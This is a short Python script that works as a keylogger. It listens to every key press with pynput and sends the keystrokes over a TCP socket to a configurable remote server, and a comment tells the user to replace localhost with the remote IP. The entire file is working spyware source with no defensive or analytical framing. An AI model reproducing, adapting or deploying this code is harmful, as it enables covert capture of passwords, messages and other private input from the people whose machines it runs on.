import socket
from pynput.keyboard import Listener

# Configurations
ip = 'localhost' # Change this address to the IP address of remote server 
port = 8080

# Making a connection to remote machine
def conn():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        print(f"Connected to {ip}:{port}")
        return s
    except Exception as e:
        print(f"Error connecting to server: {e}")
        return None

# Sendig keystrokes to remote machine
def send_keystroke(key, s):
    try:
        k = str(key).replace("'", "")
        if k == 'Key.space':
            k = ' '
        elif k == 'Key.enter':
            k = '\n'
        elif k == 'Key.backspace':
            k = ' Backspace '
        elif k == 'Key.shift' or k == 'Key.shift_r':
            k = ' Shift '
        elif k == 'Key.ctrl_l' or k == 'Key.ctrl_r':
            k = ' Ctrl '
        elif k == 'Key.caps_lock':
            k = ' CapsLock '
        elif k.startswith('Key'):
            k = ''  # Ignore other special keys

        if k:
            print(f"Sending keystroke: {k}")  # Log messages of keystroke being sent
            s.sendall(k.encode('utf-8'))
    except Exception as e:
        print(f"Error sending data: {e}")
        s.close()
        s = conn()
# Main
def main():
    s = conn()
    if s:
        with Listener(on_press=lambda key: send_keystroke(key, s)) as listener:
            listener.join()
        s.close()
    else:
        print("Failed to connect to server.")

if __name__ == "__main__":
    main()
